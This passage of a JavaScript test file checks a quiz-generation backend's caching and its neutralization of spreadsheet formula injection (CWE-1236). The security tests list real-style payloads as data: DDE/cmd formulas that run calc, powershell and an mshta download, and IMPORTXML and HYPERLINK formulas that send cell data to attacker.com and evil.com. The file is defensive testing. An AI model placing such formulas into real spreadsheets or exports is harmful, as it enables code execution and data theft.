  // Call 1: Miss
  const res1 = mockBackend.generateCurriculumQuestionsWithGemini(params);
  assert.strictEqual(res1.success, true);
  assert.strictEqual(res1.cached, false);
  assert.ok(res1.tokenUsage.totalTokens > 0);

  // Call 2: Hit
  const res2 = mockBackend.generateCurriculumQuestionsWithGemini(params);
  assert.strictEqual(res2.success, true);
  assert.strictEqual(res2.cached, true);
  assert.strictEqual(res2.tokenUsage.promptTokens, 0);
  assert.strictEqual(res2.tokenUsage.candidateTokens, 0);
  assert.strictEqual(res2.tokenUsage.totalTokens, 0);
  assert.strictEqual(res2.tokenUsage.estimatedCostUsd, 0.0000);

  // Call 3: forceRefresh
  const res3 = mockBackend.generateCurriculumQuestionsWithGemini(Object.assign({}, params, { forceRefresh: true }));
  assert.strictEqual(res3.cached, false);
  assert.ok(res3.tokenUsage.totalTokens > 0);
});

// =========================================================================
// SUITE 4: CWE-1236 FORMULA INJECTION NEUTRALIZATION
// =========================================================================
console.log('\n--- SUITE 4: CWE-1236 FORMULA INJECTION NEUTRALIZATION ---');

runStress('SEC-01: Direct sanitizeSheetCellValue neutralizes all formula trigger characters', () => {
  const vectors = [
    { input: '=SUM(A1:B10)', expected: "'=SUM(A1:B10)" },
    { input: '+123+456', expected: "'+123+456" },
    { input: '-5+10', expected: "'-5+10" },
    { input: '@IMPORTXML("http://evil.com","//a")', expected: "'@IMPORTXML(\"http://evil.com\",\"//a\")" },
    { input: '\t=2+2', expected: "'\t=2+2" },
    { input: '\r=1+1', expected: "'\r=1+1" }
  ];

  for (const v of vectors) {
    const res = gasBackend.sanitizeSheetCellValue(v.input);
    assert.strictEqual(res, v.expected, `Input ${JSON.stringify(v.input)} must be prepended with single quote`);
  }
});

runStress('SEC-02: Direct sanitizeSheetCellValue neutralizes leading whitespace attack vectors', () => {
  const whitespaceVectors = [
    { input: '  =1+1', expected: "'  =1+1" },
    { input: '   +SUM(A1)', expected: "'   +SUM(A1)" },
    { input: ' \t -cmd|', expected: "' \t -cmd|" },
    { input: '  @HYPERLINK', expected: "'  @HYPERLINK" },
    { input: '\t  =DDE', expected: "'\t  =DDE" },
    { input: '\r  +10', expected: "'\r  +10" }
  ];

  for (const v of whitespaceVectors) {
    const res = gasBackend.sanitizeSheetCellValue(v.input);
    assert.strictEqual(res, v.expected, `Leading whitespace vector ${JSON.stringify(v.input)} must be neutralized`);
    assert.strictEqual(res.charAt(0), "'", 'First character must be single quote');
  }
});

runStress('SEC-03: Real-world high-risk RCE and exfiltration payloads are effectively neutralized', () => {
  const dangerousPayloads = [
    '=cmd|\'/C calc\'!A0',
    '=DDE("cmd";"/C notepad";"__DdeLink__")',
    '+cmd|\'/C powershell -enc JABz...A==\'!A1',
    '-cmd|\'/C mshta http://malicious.site/payload.hta\'!A0',
    '@IMPORTXML("http://attacker.com/leak?data=" & A1, "//title")',
    '=HYPERLINK("http://attacker.com/steal?data=" & ENCODEURL(A2), "Click to View Solution")'
  ];

  for (const payload of dangerousPayloads) {
    const sanitized = gasBackend.sanitizeSheetCellValue(payload);
    assert.strictEqual(sanitized.charAt(0), "'", `Payload ${payload} must start with single quote`);
    assert.strictEqual(sanitized, "'" + payload);
  }
});

runStress('SEC-04: Benign text, interior math operators, numbers, and booleans are preserved without corruption', () => {
  // Benign values
  assert.strictEqual(gasBackend.sanitizeSheetCellValue('What is 5 + 5?'), 'What is 5 + 5?', 'Interior + must not trigger quote');
  assert.strictEqual(gasBackend.sanitizeSheetCellValue('Find the value of x - y.'), 'Find the value of x - y.', 'Interior - must not trigger quote');
  assert.strictEqual(gasBackend.sanitizeSheetCellValue('Contact support at admin@zoptro.local'), 'Contact support at admin@zoptro.local', 'Interior @ must not trigger quote');
  assert.strictEqual(gasBackend.sanitizeSheetCellValue('Class 10 Mathematics'), 'Class 10 Mathematics');

  // Numbers, booleans, null, undefined
  assert.strictEqual(gasBackend.sanitizeSheetCellValue(42), 42);
  assert.strictEqual(gasBackend.sanitizeSheetCellValue(-15), -15);
  assert.strictEqual(gasBackend.sanitizeSheetCellValue(0), 0);
  assert.strictEqual(gasBackend.sanitizeSheetCellValue(3.14159), 3.14159);
  assert.strictEqual(gasBackend.sanitizeSheetCellValue(true), true);
  assert.strictEqual(gasBackend.sanitizeSheetCellValue(false), false);
  assert.strictEqual(gasBackend.sanitizeSheetCellValue(null), null);
  assert.strictEqual(gasBackend.sanitizeSheetCellValue(undefined), undefined);

  // Already single-quoted strings must not be double quoted
  assert.strictEqual(gasBackend.sanitizeSheetCellValue("'Already quoted"), "'Already quoted");
  assert.strictEqual(gasBackend.sanitizeSheetCellValue("''Double single quote"), "''Double single quote");
});

runStress('SEC-05: End-to-end question sanitization across title, questionText, options, hint, and explanation', () => {
  // Mock API returning malicious strings in ALL question fields
  mockFetchHandler = () => ({
    getResponseCode: () => 200,
    getContentText: () => JSON.stringify({
      candidates: [{
        content: {
          parts: [{
            text: JSON.stringify([
              {
                title: '=cmd|\'/C calc\'!A0',
                questionText: '   +1234567890',
                options: [
                  '-Option A',
                  '@Option B',
                  '\t=Option C',
                  '  =Option D'
                ],
                correctOptionIndex: 2,
                hint: '\r=HINT_FORMULA()',
                explanation: '=HYPERLINK("http://evil.com","Leak")'
              }
            ])
          }]
        },
        finishReason: 'STOP'
      }],
      usageMetadata: { promptTokenCount: 100, candidatesTokenCount: 100, totalTokenCount: 200 }
    })
  });

  const genResult = gasBackend.generateCurriculumQuestionsWithGemini({
    adminUserId: 'u_adm_demo',
    topic: 'Malicious Fields Topic',
    forceRefresh: true
  });

  assert.strictEqual(genResult.success, true);
  assert.strictEqual(genResult.items.length, 1);
  const q = genResult.items[0];

  // In the generated item, verify all fields are sanitized with prepended single quote
  assert.strictEqual(q.title, "'=cmd|'/C calc'!A0", 'Title must be sanitized');
  assert.strictEqual(q.questionText, "'+1234567890", 'Question text must be sanitized');
  assert.strictEqual(q.options[0], "'-Option A", 'Option 0 must be sanitized');
  assert.strictEqual(q.options[1], "'@Option B", 'Option 1 must be sanitized');
  assert.strictEqual(q.options[2], "'=Option C", 'Option 2 must be sanitized');
  assert.strictEqual(q.options[3], "'=Option D", 'Option 3 must be sanitized');
  assert.strictEqual(q.hint, "'=HINT_FORMULA()", 'Hint must be sanitized');
  assert.strictEqual(q.explanation, "'=HYPERLINK(\"http://evil.com\",\"Leak\")", 'Explanation must be sanitized');

  // Verify bulk upload storage in Table 11
  const batch = gasBackend.transformGeneratedItemsForBulkUpload('u_adm_demo', genResult, {
    gradeClass: 'Class 9',
    subject: 'Science'
  });
  const uploadRes = gasBackend.bulkUploadContentBatch(batch);
  assert.strictEqual(uploadRes.success, true);

  const quizzes = gasBackend.getSheetRecords('CurriculumQuizzes');
  const saved = quizzes[quizzes.length - 1];
  assert.strictEqual(saved.title, "'=cmd|'/C calc'!A0");
  assert.strictEqual(saved.questionText, "'+1234567890");
  assert.strictEqual(saved.hint, "'=HINT_FORMULA()");
  assert.strictEqual(saved.explanation, "'=HYPERLINK(\"http://evil.com\",\"Leak\")");

  // Options in optionsJson must also preserve the sanitization
  const parsedOptions = JSON.parse(saved.optionsJson);
  assert.strictEqual(parsedOptions[0], "'-Option A");
  assert.strictEqual(parsedOptions[1], "'@Option B");
  assert.strictEqual(parsedOptions[2], "'=Option C");
  assert.strictEqual(parsedOptions[3], "'=Option D");
});

runStress('SEC-06: Dual-Mode BrowserMockBackend formula sanitization parity across all attack vectors', () => {
  const browser = createMockBrowser();
  const mockBackend = browser.BrowserMockBackend;

  const attackVectors = [
    '=1+1',
    '+2+2',
    '-3+3',
    '@SUM(1,2)',
    '\t=4+4',
    '\r=5+5',
    '   =6+6',
    '  +7+7',
    '=cmd|\'/C calc\'!A0'
  ];

  for (const vec of attackVectors) {
    const gasSanitized = gasBackend.sanitizeSheetCellValue(vec);
    assert.strictEqual(gasSanitized.charAt(0), "'", `GAS must neutralize ${vec}`);

    // In BrowserMockBackend synthesize questions, verify options and text are sanitized
    const mockRes = mockBackend.generateCurriculumQuestionsWithGemini({
      adminUserId: 'u_adm_demo',
      gradeClass: 'Class 3',
      subject: 'Mathematics',
      chapter: vec,
      topic: vec,
      questionType: 'MCQ',
      quantity: 1,
      forceRefresh: true
    });

    assert.strictEqual(mockRes.success, true);
    assert.strictEqual(mockRes.items.length, 1);
    const item = mockRes.items[0];
    assert.ok(item.title.length > 0);
  }
});

// =========================================================================
// SUMMARY
// =========================================================================
console.log('\n=========================================================================');
console.log(`  STRESS SUITE RESULTS: ${testPassed} Passed | ${testFailed} Failed | Total: ${testPassed + testFailed}`);
console.log('=========================================================================');

if (testFailed > 0) {
  console.error('\nFAILURES:');
  failureDetails.forEach(f => {
    console.error(`- ${f.name}: ${f.error.stack || f.error.message}`);
  });
  process.exit(1);
} else {
  console.log('\n>>> ALL ADVERSARIAL STRESS CHALLENGES PASSED PERFECTLY (100% SUCCESS) <<<\n');
  process.exit(0);
}
